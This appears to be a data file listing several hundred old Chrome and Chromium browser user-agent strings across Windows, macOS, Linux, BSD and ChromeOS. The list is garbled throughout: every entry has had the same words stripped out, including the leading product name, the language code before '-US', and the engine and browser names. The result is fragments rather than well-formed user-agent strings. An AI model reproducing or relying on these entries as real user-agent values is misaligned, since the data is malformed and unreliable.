	"/5.0 Windows; U; Windows NT 6.1; -US /534.17 KHTML,  Gecko /11.0.655.0 Safari/534.17"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.17 KHTML,  Gecko /11.0.655.0 Safari/534.17"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.17 KHTML,  Gecko /11.0.654.0 Safari/534.17"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.17 KHTML,  Gecko /11.0.652.0 Safari/534.17"
	"/4.0 Windows NT 6.3; Win64; x64 /537.36 KHTML,  Gecko /11.0.1245.0 Safari/537.36"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.17 KHTML,  Gecko /10.0.649.0 Safari/534.17"
	"/5.0 Windows; U; Windows NT 6.1; -DE /534.17 KHTML,  Gecko /10.0.649.0 Safari/534.17"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.0.648.82 Safari/534.16"
	"/5.0 X11; U; Linux armv7l; -US /534.16 KHTML,  Gecko /10.0.648.204 Safari/534.16"
	"/5.0 X11; U; FreeBSD x86_64; -US /534.16 KHTML,  Gecko /10.0.648.204 Safari/534.16"
	"/5.0 X11; U; FreeBSD i386; -US /534.16 KHTML,  Gecko /10.0.648.204 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_5; -US /534.16 KHTML,  Gecko /10.0.648.204"
	"/5.0 X11; U; Linux i686; -US /534.16 KHTML,  Gecko /10.0.648.134 Safari/534.16"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.16 KHTML,  Gecko /10.0.648.134 Safari/534.16"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.16 KHTML,  Gecko /10.0.648.134 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; -US /534.16 KHTML,  Gecko /10.0.648.134 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.10 Chromium/10.0.648.133 /10.0.648.133 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.0.648.133 Safari/534.16"
	"/5.0 X11; U; Linux i686; -US /534.16 KHTML,  Gecko /10.10 Chromium/10.0.648.133 /10.0.648.133 Safari/534.16"
	"/5.0 X11; U; Linux i686; -US /534.16 KHTML,  Gecko /10.0.648.133 Safari/534.16"
	"/5.0 Windows; U; Windows NT 6.0; -US /534.16 KHTML,  Gecko /10.0.648.133 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -US /534.16 KHTML,  Gecko /10.0.648.133 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -US /534.16 KHTML,  Gecko /10.0.648.133 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.10 Chromium/10.0.648.127 /10.0.648.127 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.0.648.127 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.16 KHTML,  Gecko /10.0.648.127 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /534.16 KHTML,  Gecko /10.0.648.127 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.0.648.11 Safari/534.16"
	"/5.0 Windows; U; Windows NT 6.1; -RU; /534.16; KHTML;  Gecko; /10.0.648.11;Safari/534.16"
	"/5.0 Windows; U; Windows NT 6.1; -RU /534.16 KHTML,  Gecko /10.0.648.11 Safari/534.16"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.16 KHTML,  Gecko /10.0.648.11 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.10 Chromium/10.0.648.0 /10.0.648.0 Safari/534.16"
	"/5.0 X11; U; Linux i686; -US /534.16 KHTML,  Gecko /10.10 Chromium/10.0.648.0 /10.0.648.0 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.16 KHTML,  Gecko /10.0.648.0 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /10.10 Chromium/10.0.642.0 /10.0.642.0 Safari/534.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_5; -US /534.16 KHTML,  Gecko /10.0.639.0 Safari/534.16"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.16 KHTML,  Gecko /10.0.638.0 Safari/534.16"
	"/5.0 X11; U; Linux i686 x86_64; -US /534.16 KHTML,  Gecko /10.0.634.0 Safari/534.16"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.16 KHTML,  Gecko /10.0.634.0 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.16 SUSE/10.0.626.0 KHTML,  Gecko /10.0.626.0 Safari/534.16"
	"/5.0 X11; U; Linux x86_64; -US /534.15 KHTML,  Gecko /10.0.613.0 Safari/534.15"
	"/5.0 X11; U; Linux i686; -US /534.15 KHTML,  Gecko /10.10 Chromium/10.0.613.0 /10.0.613.0 Safari/534.15"
	"/5.0 X11; U; Linux i686; -US /534.15 KHTML,  Gecko /10.04 Chromium/10.0.612.3 /10.0.612.3 Safari/534.15"
	"/5.0 X11; U; Linux i686; -US /534.15 KHTML,  Gecko /10.0.612.1 Safari/534.15"
	"/5.0 X11; U; Linux i686; -US /534.15 KHTML,  Gecko /10.10 Chromium/10.0.611.0 /10.0.611.0 Safari/534.15"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.14 KHTML,  Gecko /10.0.602.0 Safari/534.14"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.14 KHTML,  Gecko /10.0.601.0 Safari/534.14"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.14 KHTML,  Gecko /10.0.601.0 Safari/534.14"
	"/5.0 X11; U; Linux x86_64; -US /540.0 KHTML, Gecko /9.1.0.0 Safari/540.0"
	"/5.0 X11; U; Linux x86_64; -US /540.0 KHTML,  Gecko /10.10 /9.1.0.0 Safari/540.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /534.14 KHTML,  Gecko /9.0.601.0 Safari/534.14"
	"/5.0 X11; U; Linux x86_64; -US /534.14 KHTML,  Gecko /10.10 Chromium/9.0.600.0 /9.0.600.0 Safari/534.14"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.14 KHTML,  Gecko /9.0.600.0 Safari/534.14"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.13 KHTML,  Gecko /9.0.599.0 Safari/534.13"
	"/5.0 Windows; U; Windows NT 5.1; -CA /534.13 KHTML  Gecko /9.0.597.98 Safari/534.13"
	"/5.0 X11; U; Linux i686; -US /534.13 KHTML,  Gecko /9.0.597.84 Safari/534.13"
	"/5.0 X11; U; Linux i686; -US /534.13 KHTML,  Gecko /9.0.597.44 Safari/534.13"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.13 KHTML,  Gecko /9.0.597.19 Safari/534.13"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.13 KHTML,  Gecko /9.0.597.15 Safari/534.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_5; -US /534.13 KHTML,  Gecko /9.0.597.15 Safari/534.13"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /9.0.597.107 Safari/534.13 v1416758524.9051"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /9.0.597.107 Safari/534.13 v1416748405.3871"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /9.0.597.107 Safari/534.13 v1416670950.695"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /9.0.597.107 Safari/534.13 v1416664997.4379"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /9.0.597.107 Safari/534.13 v1333515017.9196"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /9.0.597.0 Safari/534.13"
	"/5.0 Windows; U; Windows NT 6.1; -US  /534.13 KHTML,  Gecko /9.0.597.0 Safari/534.13"
	"/5.0 Windows; U; Windows NT 6.0; -US /534.13 KHTML,  Gecko /9.0.597.0 Safari/534.13"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.13 KHTML,  Gecko /9.0.597.0 Safari/534.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_5; -US /534.13 KHTML,  Gecko /9.0.597.0 Safari/534.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.13 KHTML,  Gecko /9.0.597.0 Safari/534.13"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.13 KHTML,  Gecko /9.0.596.0 Safari/534.13"
	"/5.0 X11; U; Linux x86_64; -US /534.13 KHTML,  Gecko /10.04 Chromium/9.0.595.0 /9.0.595.0 Safari/534.13"
	"/5.0 X11; U; Linux i686; -US /534.13 KHTML,  Gecko /9.10 Chromium/9.0.592.0 /9.0.592.0 Safari/534.13"
	"/5.0 X11; U; Windows NT 6; -US /534.12 KHTML,  Gecko /9.0.587.0 Safari/534.12"
	"/5.0 Windows  U  Windows NT 5.1  -US /534.12 KHTML,  Gecko /9.0.583.0 Safari/534.12"
	"/5.0 X11; U; Linux i686; -US /534.12 KHTML,  Gecko /9.0.579.0 Safari/534.12"
	"/5.0 X11; U; Linux i686 x86_64; -US /534.12 KHTML,  Gecko /9.0.576.0 Safari/534.12"
	"/5.0 X11; U; Linux x86_64; -US /540.0 KHTML,  Gecko /10.10 /8.1.0.0 Safari/540.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.10 KHTML,  Gecko /8.0.558.0 Safari/534.10"
	"/5.0 X11; U; CrOS i686 0.9.130; -US /534.10 KHTML,  Gecko /8.0.552.344 Safari/534.10"
	"/5.0 X11; U; CrOS i686 0.9.128; -US /534.10 KHTML,  Gecko /8.0.552.343 Safari/534.10"
	"/5.0 X11; U; CrOS i686 0.9.128; -US /534.10 KHTML,  Gecko /8.0.552.341 Safari/534.10"
	"/5.0 X11; U; CrOS i686 0.9.128; -US /534.10 KHTML,  Gecko /8.0.552.339 Safari/534.10"
	"/5.0 X11; U; CrOS i686 0.9.128; -US /534.10 KHTML,  Gecko /8.0.552.339"
	"/5.0 X11; U; Linux x86_64; -US /534.10 KHTML,  Gecko /10.10 Chromium/8.0.552.237 /8.0.552.237 Safari/534.10"
	"/5.0 Windows; U; Windows NT 6.1; -DE /534.10 KHTML,  Gecko /8.0.552.224 Safari/534.10"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.3 KHTML,  Gecko /8.0.552.224 Safari/533.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_8; -US /534.10 KHTML,  Gecko /8.0.552.224 Safari/534.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /534.10 KHTML,  Gecko /8.0.552.224 Safari/534.10"
	"/5.0 X11; U; Linux x86_64; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.10 KHTML,  Gecko /8.0.552.210 Safari/534.10"
	"/5.0 X11; U; Linux x86_64; -US /534.10 KHTML,  Gecko /8.0.552.200 Safari/534.10"
	"/5.0 X11; U; Linux i686; -US /534.10 KHTML,  Gecko /8.0.551.0 Safari/534.10"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.10 KHTML,  Gecko /7.0.548.0 Safari/534.10"
	"/5.0 X11; U; Linux x86_64; -US /534.10 KHTML,  Gecko /7.0.544.0 Safari/534.10"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.15 Gecko/20101027 "
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /7.0.540.0 Safari/534.10"
	"/5.0 Windows; U; Windows NT 6.1; -DE /534.10 KHTML,  Gecko /7.0.540.0 Safari/534.10"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.10 KHTML,  Gecko /7.0.540.0 Safari/534.10"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.9 KHTML,  Gecko /7.0.531.0 Safari/534.9"
	"/5.0 Windows; U; Windows NT 6.0; -US /534.8 KHTML,  Gecko /7.0.521.0 Safari/534.8"
	"/5.0 X11; U; Linux i686; -US /534.7 KHTML,  Gecko /7.0.517.24 Safari/534.7"
	"/5.0 X11; U; Linux x86_64; fr-FR /534.7 KHTML,  Gecko /7.0.514.0 Safari/534.7"
	"/5.0 X11; U; Linux x86_64; -US /534.7 KHTML,  Gecko /7.0.514.0 Safari/534.7"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.7 KHTML,  Gecko /7.0.514.0 Safari/534.7"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.6 KHTML,  Gecko /7.0.500.0 Safari/534.6"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.6 KHTML,  Gecko /7.0.498.0 Safari/534.6"
	"/5.0  Windows; U; Windows NT 6.1; -US /534.6 KHTML,  Gecko /7.0.498.0 Safari/534.6"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.13 KHTML,  Gecko /7.0.0 Safari/700.13"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.4 KHTML,  Gecko /6.0.481.0 Safari/534.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /534.3 KHTML,  Gecko /6.0.472.63 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.3 KHTML,  Gecko /6.0.472.53 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.3 KHTML,  Gecko /6.0.472.33 Safari/534.3"
	"/5.0 X11; U; Linux x86_64; -US /534.3 KHTML,  Gecko /6.0.470.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.3 KHTML,  Gecko /6.0.464.0 Safari/534.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.3 KHTML,  Gecko /6.0.464.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.3 KHTML,  Gecko /6.0.463.0 Safari/534.3"
	"/5.0 X11; U; Linux i686; -US /534.3 KHTML,  Gecko /6.0.462.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.3 KHTML,  Gecko /6.0.462.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.3 KHTML,  Gecko /6.0.461.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.3 KHTML,  Gecko /6.0.461.0 Safari/534.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.3 KHTML,  Gecko /6.0.461.0 Safari/534.3"
	"/5.0 X11; U; Linux i686; -US /534.3 KHTML,  Gecko /6.0.460.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.3 KHTML,  Gecko /6.0.460.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.3 KHTML,  Gecko /6.0.460.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.3 KHTML,  Gecko /6.0.459.0 Safari/534.3"
	"/5.0 X11; U; Linux x86_64; -US /534.3 KHTML,  Gecko /6.0.458.1 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.3 KHTML,  Gecko /6.0.458.1 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.0; -US /534.3 KHTML,  Gecko /6.0.458.1 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.3 KHTML,  Gecko /6.0.458.1 Safari/534.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.3 KHTML,  Gecko /6.0.458.1 Safari/534.3"
	"/5.0 X11; U; Linux i686; -US /534.3 KHTML,  Gecko /6.0.458.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.3 KHTML,  Gecko /6.0.458.0 Safari/534.3"
	"/5.0 X11; U; Linux i686; -US /534.3 KHTML,  Gecko /6.0.457.0 Safari/534.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -US /534.3 KHTML,  Gecko /6.0.456.0 Safari/534.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.2 KHTML,  Gecko /6.0.454.0 Safari/534.2"
	"/5.0 Windows; U; Windows NT 5.2; -US /534.2 KHTML,  Gecko /6.0.454.0 Safari/534.2"
	"/5.0 X11; U; Linux i686; -US /534.2 KHTML,  Gecko /6.0.453.1 Safari/534.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -US /534.2 KHTML,  Gecko /6.0.453.1 Safari/534.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /534.2 KHTML,  Gecko /6.0.453.1 Safari/534.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.2 KHTML,  Gecko /6.0.451.0 Safari/534.2"
	"/5.0 X11; U; Linux i686; -US /534.1 SUSE/6.0.428.0 KHTML,  Gecko /6.0.428.0 Safari/534.1"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.1 KHTML,  Gecko /6.0.428.0 Safari/534.1"
	"/5.0 Windows; U; Windows NT 6.1; -GB /534.1 KHTML,  Gecko /6.0.428.0 Safari/534.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -US /534.1 KHTML,  Gecko /6.0.428.0 Safari/534.1"
	"/5.0 X11; U; Linux x86_64; -US /534.1 KHTML,  Gecko /6.0.427.0 Safari/534.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /534.1 KHTML,  Gecko /6.0.422.0 Safari/534.1"
	"/5.0 X11; U; Linux x86_64; -US /534.1 KHTML,  Gecko /6.0.417.0 Safari/534.1"
	"/5.0 X11; U; Linux i686; -US /534.1 KHTML,  Gecko /6.0.416.0 Safari/534.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /534.1 KHTML,  Gecko /6.0.414.0 Safari/534.1"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.9 KHTML,  Gecko /6.0.400.0 Safari/533.9"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.8 KHTML,  Gecko /6.0.397.0 Safari/533.8"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.2 KHTML,  Gecko /6.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.4 KHTML,  Gecko /5.0.375.999 Safari/533.4"
	"/5.0 X11; U; Linux x86_64; -US /533.4 KHTML,  Gecko /5.0.375.99 Safari/533.4"
	"/5.0 Windows; U; Windows NT 5.2; -US /533.4 KHTML,  Gecko /5.0.375.99 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -US /533.4 KHTML,  Gecko /5.0.375.99 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /533.4 KHTML,  Gecko /5.0.375.99 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -US /533.4 KHTML,  Gecko /5.0.375.99 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X; -US /533.4 KHTML,  Gecko /5.0.375.86 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /533.4 KHTML,  Gecko /5.0.375.86 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /533.4 KHTML,  Gecko /5.0.375.86 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -US /533.4 KHTML,  Gecko /5.0.375.70 Safari/533.4"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.4 KHTML,  Gecko /5.0.375.127 Safari/533.4"
	"/5.0 Windows; U; Windows NT 5.2; -US /533.4 KHTML,  Gecko /5.0.375.126 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; fr-FR /533.4 KHTML,  Gecko /5.0.375.126 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_8; -US /533.4 KHTML,  Gecko /5.0.375.125 Safari/533.4"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.4 KHTML,  Gecko /5.0.370.0 Safari/533.4"
	"/5.0 X11; U; Linux x86_64; -US /533.4 KHTML,  Gecko /5.0.368.0 Safari/533.4"
	"/5.0 X11; U; Linux i686; -US /533.4 KHTML,  Gecko /5.0.366.2 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -US /533.4 KHTML,  Gecko /5.0.366.0 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -US /533.4 KHTML,  Gecko /5.0.366.0 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -US /533.3 KHTML,  Gecko /5.0.363.0 Safari/533.3"
	"/5.0 X11; U; OpenBSD i386; -US /533.3 KHTML,  Gecko /5.0.359.0 Safari/533.3"
	"/5.0 X11; U; x86_64 Linux; en_GB, en_US /533.3 KHTML,  Gecko /5.0.358.0 Safari/533.3"
	"/5.0 X11; U; Linux x86_64; -US /533.3 KHTML,  Gecko /5.0.358.0 Safari/533.3"
	"/5.0 X11; U; Linux i686; -US /533.3 KHTML,  Gecko /5.0.358.0 Safari/533.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.3 KHTML,  Gecko /5.0.357.0 Safari/533.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.3 KHTML,  Gecko /5.0.356.0 Safari/533.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.3 KHTML,  Gecko /5.0.355.0 Safari/533.3"
	"/5.0 X11; U; Linux x86_64; -US /533.3 KHTML,  Gecko /5.0.354.0 Safari/533.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.3 KHTML,  Gecko /5.0.354.0 Safari/533.3"
	"/5.0 X11; U; Linux x86_64; -US /533.3 KHTML,  Gecko /5.0.353.0 Safari/533.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.3 KHTML,  Gecko /5.0.353.0 Safari/533.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -US /533.2 KHTML,  Gecko /5.0.343.0 Safari/533.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /533.2 KHTML,  Gecko /5.0.343.0 Safari/533.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_7_0; -US /533.2 KHTML,  Gecko /5.0.342.7 Safari/533.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; -US /533.2 KHTML,  Gecko /5.0.342.7 Safari/533.2"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.2 KHTML,  Gecko /5.0.342.5 Safari/533.2"
	"/5.0 X11; U; Linux x86_64; -US /533.2 KHTML,  Gecko /5.0.342.3 Safari/533.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.2 KHTML,  Gecko /5.0.342.3 Safari/533.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.2 KHTML,  Gecko /5.0.342.2 Safari/533.2"
	"/5.0 X11; U; Linux x86_64; -US /533.2 KHTML,  Gecko /5.0.342.1 Safari/533.2"
	"/5.0 X11; U; Linux i586; -US /533.2 KHTML,  Gecko /5.0.342.1 Safari/533.2"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.2 KHTML,  Gecko /5.0.342.1 Safari/533.2"
	"/5.0 X11; U; Linux x86_64; -US /533.1 KHTML,  Gecko /5.0.335.0 Safari/533.1"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN /533.16 KHTML,  Gecko /5.0.335.0 Safari/533.16"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.9 KHTML,  Gecko /5.0.310.0 Safari/532.9"
	"/5.0 X11; U; Linux x86_64; -US /532.9 KHTML,  Gecko /5.0.309.0 Safari/532.9"
	"/5.0 X11; U; Linux x86_64; -US /532.9 KHTML,  Gecko /5.0.308.0 Safari/532.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.9 KHTML,  Gecko /5.0.307.11 Safari/532.9"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.9 KHTML,  Gecko /5.0.307.1 Safari/532.9"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.5 KHTML,  Gecko /4.1.249.1025 Safari/532.5"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.8 KHTML,  Gecko /4.0.302.2 Safari/532.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.8 KHTML,  Gecko /4.0.288.1 Safari/532.8"
	"/5.0 X11; U; Linux i686; -US /532.8 KHTML,  Gecko /4.0.277.0 Safari/532.8"
	"/5.0 X11; U;  Linux x86_64; -US /532.5 KHTML,  Gecko /4.0.249.30 Safari/532.5"
	"/5.0 Windows; U; Windows NT 6.1; -IT /532.5 KHTML,  Gecko /4.0.249.25 Safari/532.5"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.5 KHTML,  Gecko /4.0.249.0 Safari/532.5"
	"/5.0 Macintosh; U; Intel Mac OS X 10_8; -US /532.5 KHTML,  Gecko /4.0.249.0 Safari/532.5"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.5 KHTML,  Gecko /4.0.246.0 Safari/532.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.4 KHTML,  Gecko /4.0.241.0 Safari/532.4"
	"/5.0 X11; U; Linux i686; -US /532.4 KHTML,  Gecko /4.0.237.0 Safari/532.4 "
	"/5.0 Windows; U; Windows NT 6.1; -US /532.3 KHTML,  Gecko /4.0.227.0 Safari/532.3"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.3 KHTML,  Gecko /4.0.224.2 Safari/532.3"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.3 KHTML,  Gecko /4.0.223.5 Safari/532.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.223.4 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.223.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -DE /4.0.223.3 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.223.2 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.223.2 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.2 KHTML,  Gecko /4.0.223.2 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.223.2 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.223.1 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.2 KHTML,  Gecko /4.0.223.1 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.223.1 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.2 KHTML,  Gecko /4.0.223.0 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.222.8 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.222.7 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.222.6 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.222.6 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.2 KHTML,  Gecko /4.0.222.6 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.222.5 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.222.5 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.222.5 Safari/532.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.2 KHTML,  Gecko /4.0.222.5 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.222.4 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.222.4 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.222.4 Safari/532.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /532.2 KHTML,  Gecko /4.0.222.4 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.2 KHTML,  Gecko /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.222.3 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.222.2 Safari/532.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.2 KHTML,  Gecko /4.0.222.2 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.2 KHTML,  Gecko /4.0.222.12 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.2 KHTML,  Gecko /4.0.222.12 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.222.12 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.222.1 Safari/532.2"
